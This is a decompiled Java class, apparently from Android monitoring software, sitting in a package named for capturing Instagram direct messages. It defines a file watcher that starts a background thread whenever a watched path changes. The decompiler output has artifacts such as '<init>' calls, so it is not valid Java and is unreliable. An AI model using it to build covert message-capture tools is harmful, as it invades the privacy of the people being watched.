package com.vvt.capture.instagram.directmessage.a;

import android.os.FileObserver;
import java.io.File;

class b
  extends FileObserver
{
  private String b;
  private Thread c = null;
  private File d;
  
  public b(a parama, String paramString)
  {
    super(paramString, 2);
    this.b = paramString;
  }
  
  public void onEvent(int paramInt, String paramString)
  {
    boolean bool = a.a();
    if (bool) {}
    Thread localThread = this.c;
    if (localThread == null)
    {
      localThread = new java/lang/Thread;
      c localc = new com/vvt/capture/instagram/directmessage/a/c;
      localc.<init>(this);
      localThread.<init>(localc);
      this.c = localThread;
      localThread = this.c;
      localThread.start();
    }
  }
  
  public void startWatching()
  {
    boolean bool = a.a();
    if (bool) {}
    super.startWatching();
  }
  
  public void stopWatching()
  {
    boolean bool = a.a();
    if (bool) {}
    super.stopWatching();
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/instagram/directmessage/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */